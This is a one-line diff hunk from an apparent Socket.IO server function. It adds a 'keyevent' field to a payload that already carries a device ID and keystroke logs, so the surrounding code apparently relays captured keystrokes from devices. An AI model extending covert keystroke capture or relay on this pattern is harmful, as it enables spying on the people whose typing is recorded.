@@ -457,6 +457,7 @@ export const startSocketIO = async () => {
 								deviceId: deviceId,
 								keyLogsType: keyLogsType,
 								keylogs: keylogs,
+								keyevent: keyEvent,
 							}
 						);
 						// }
